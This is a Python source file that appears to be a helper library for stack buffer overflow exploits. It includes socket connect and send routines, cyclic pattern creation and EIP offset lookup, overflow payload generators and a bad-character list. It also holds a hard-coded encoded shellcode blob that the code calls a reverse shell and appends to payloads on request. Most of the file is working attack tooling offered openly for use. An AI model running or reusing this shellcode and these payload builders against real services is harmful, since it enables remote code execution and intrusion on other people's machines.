import os
import struct
os.system('color')
import time


class JihadLibrary(object):
    def ip(self):
        return input(colors.BOLD +"What is the ip address(192.168.1.54): " + colors.END) or "192.168.1.54"
    def port(self):
        return int(input(colors.BOLD +"What is the the port(9999) : " + colors.END) or "9999")

    def copyRight(self):
        print(colors.HEADER + """"
            ____   __ __       ____  ____  __ __   ____  ___          ___  _           _____  ____  __ __    ___  ___   
            |    \ |  |  |     |    ||    ||  |  | /    ||   \        /  _]| |         / ___/ /    ||  |  |  /  _]|   \  
            |  o  )|  |  |     |__  | |  | |  |  ||  o  ||    \      /  [_ | |        (   \_ |  o  ||  |  | /  [_ |    \ 
            |     ||  ~  |     __|  | |  | |  _  ||     ||  D  |    |    _]| |___      \__  ||     ||  ~  ||    _]|  D  |
            |  O  ||___, |    /  |  | |  | |  |  ||  _  ||     |    |   [_ |     |     /  \ ||  _  ||___, ||   [_ |     |
            |     ||     |    \  `  | |  | |  |  ||  |  ||     |    |     ||     |     \    ||  |  ||     ||     ||     |
            |_____||____/      \____||____||__|__||__|__||_____|    |_____||_____|      \___||__|__||____/ |_____||_____|
            look at www.neetechs.com for more script
            """ + colors.END)
    def connectToSocket(self,socket, ip, port, s=None):
        if s is None:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = s
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.send(bytes(buffer + b"\r\n", "latin-1"))
        s.connect((ip, port))
        #s.bind((ip, port))
        print(colors.OkGreen + ip + ":" + str(port) + " has been connected" + colors.END)
        return s
    
    def receiveFromSocket(self,s):
        import time
        print(colors.WARNING + "Received: " + colors.END)
        s.setblocking(1)	
        data = s.recv(1024)
        data = data.decode()
        print(f"{colors.OkCyan}       {data} {colors.END}")
        time.sleep(0.5)
        

    def sendToSocket(self,s,message):
        #s.send(message)
        isString = isinstance(message, str)
        if isString:
            print("converting payload to binary")
            s.sendall(message.encode('ascii') )
            print(colors.OkGreen + "This message:" + message + "\n has been send successfully" + colors.END)

        else:
            s.send(message)

        #s.sendall(message)
    # Create Pattern
    def createPattern(self,length):
        from string import ascii_uppercase, ascii_lowercase, digits

        pattern = ""
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    if len(pattern) < length:
                        pattern += upper + lower + digit

                    else:
                        out = pattern[:length]
                        return out

        # If we end up here we've exhausted all characters so truncate the pattern
        #return pattern[:length]
        return pattern
    
    def randomCharacters(self,y):
        import random
        import string
        return ''.join(random.choice(string.ascii_letters) for x in range(y))
    # Offset Pattern
    def offsetPattern(self, payload, totalCharacter):
        from string import ascii_uppercase, ascii_lowercase, digits

        #IP = input("enter the EIP(0x1234567A): ") or "0x31704330"
        eIP = input("enter the EIP(1234567A): ") or "31704330"
        print(eIP)
        needle = eIP

        try:
            #if needle.startswith("0x"):
            if needle.startswith(""):
                # Strip off '0x', convert to ASCII and reverse
                needle = needle[2:]
                needle = bytearray.fromhex(needle).decode("ascii")
                needle = needle[::-1]
                #return needle
        except (ValueError, TypeError) as e:
            print(e)
            raise

        haystack = ""
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    haystack += upper + lower + digit
                    found_at = haystack.find(needle)
                    if found_at > -1:
                        return found_at
    
    def generatePayload(self):
        # get input
        payload = "This should be the random characters"
        character = input("what is the character(random): ") or self.randomCharacters(1)
        totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
        payload = (character * totalCharacter)
        
        return payload, totalCharacter
    def generateRandomPayload(self):
        # get input
        payload = "This should be the random characters"
        character = input("what is the character(random): ") or self.randomCharacters(1)
        totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
        payload = JihadLibrary().createPattern(totalCharacter) 
        
               
        return payload, totalCharacter

    def generateMessage(self,payload):
        payload = input(colors.WARNING + "What is your message(default:anonymessage): " + colors.END) or "anonymessage"
        return payload
    
    def addReverseShell(self, payload, reverseShell = None):
        addShell = input(colors.WARNING + "Do you want to add reverse shell(y or n)(default:n): " + colors.END) or "n"
        if addShell == "y":
            if reverseShell:
                pass
            else:
                payload = payload.encode('ascii')
                reverseShell = self.generateReverseShell()
                
                payload += reverseShell
                print(bytes(payload))
        # future update in sha allah
        return payload
    
    def listeningToPort(self,s):
        # client example
        
        while True:
            time.sleep(5)
            data = s.recv(512)
            if data.lower() == 'q':
                s.close()
                break

            print("RECEIVED: %s" % data)
            data = input("SEND( TYPE q or Q to Quit):")
            s.send(data)
            if data.lower() == 'q':
                s.close()
                break

    def generateReverseShell(self):
        # space to make sure that the shell will run
        buf =  b"\xdf\x14\x50\62" #+ b"\x90" * 32
        # the shell
        buf =  b""
        buf += b"\xba\x8e\x7f\x34\xe6\xda\xc5\xd9\x74\x24\xf4\x58\x31\xc9"
        buf += b"\xb1\x52\x31\x50\x12\x03\x50\x12\x83\x66\x83\xd6\x13\x8a"
        buf += b"\x94\x95\xdc\x72\x65\xfa\x55\x97\x54\x3a\x01\xdc\xc7\x8a"
        buf += b"\x41\xb0\xeb\x61\x07\x20\x7f\x07\x80\x47\xc8\xa2\xf6\x66"
        buf += b"\xc9\x9f\xcb\xe9\x49\xe2\x1f\xc9\x70\x2d\x52\x08\xb4\x50"
        buf += b"\x9f\x58\x6d\x1e\x32\x4c\x1a\x6a\x8f\xe7\x50\x7a\x97\x14"
        buf += b"\x20\x7d\xb6\x8b\x3a\x24\x18\x2a\xee\x5c\x11\x34\xf3\x59"
        buf += b"\xeb\xcf\xc7\x16\xea\x19\x16\xd6\x41\x64\x96\x25\x9b\xa1"
        buf += b"\x11\xd6\xee\xdb\x61\x6b\xe9\x18\x1b\xb7\x7c\xba\xbb\x3c"
        buf += b"\x26\x66\x3d\x90\xb1\xed\x31\x5d\xb5\xa9\x55\x60\x1a\xc2"
        buf += b"\x62\xe9\x9d\x04\xe3\xa9\xb9\x80\xaf\x6a\xa3\x91\x15\xdc"
        buf += b"\xdc\xc1\xf5\x81\x78\x8a\x18\xd5\xf0\xd1\x74\x1a\x39\xe9"
        buf += b"\x84\x34\x4a\x9a\xb6\x9b\xe0\x34\xfb\x54\x2f\xc3\xfc\x4e"
        buf += b"\x97\x5b\x03\x71\xe8\x72\xc0\x25\xb8\xec\xe1\x45\x53\xec"
        buf += b"\x0e\x90\xf4\xbc\xa0\x4b\xb5\x6c\x01\x3c\x5d\x66\x8e\x63"
        buf += b"\x7d\x89\x44\x0c\x14\x70\x0f\xf3\x41\x7b\xdb\x9b\x93\x7b"
        buf += b"\xfd\x3a\x1d\x9d\x6b\xad\x4b\x36\x04\x54\xd6\xcc\xb5\x99"
        buf += b"\xcc\xa9\xf6\x12\xe3\x4e\xb8\xd2\x8e\x5c\x2d\x13\xc5\x3e"
        buf += b"\xf8\x2c\xf3\x56\x66\xbe\x98\xa6\xe1\xa3\x36\xf1\xa6\x12"
        buf += b"\x4f\x97\x5a\x0c\xf9\x85\xa6\xc8\xc2\x0d\x7d\x29\xcc\x8c"
        buf += b"\xf0\x15\xea\x9e\xcc\x96\xb6\xca\x80\xc0\x60\xa4\x66\xbb"
        buf += b"\xc2\x1e\x31\x10\x8d\xf6\xc4\x5a\x0e\x80\xc8\xb6\xf8\x6c"
        buf += b"\x78\x6f\xbd\x93\xb5\xe7\x49\xec\xab\x97\xb6\x27\x68\xa7"
        buf += b"\xfc\x65\xd9\x20\x59\xfc\x5b\x2d\x5a\x2b\x9f\x48\xd9\xd9"
        buf += b"\x60\xaf\xc1\xa8\x65\xeb\x45\x41\x14\x64\x20\x65\x8b\x85"
        buf += b"\x61"
        return (buf)
    
    def badChars():
        char = (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
            )
        return char
class colors:
    HEADER = '\033[95m'
    OkBlue = '\033[94m'
    OkCyan = '\033[96m'
    OkGreen = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
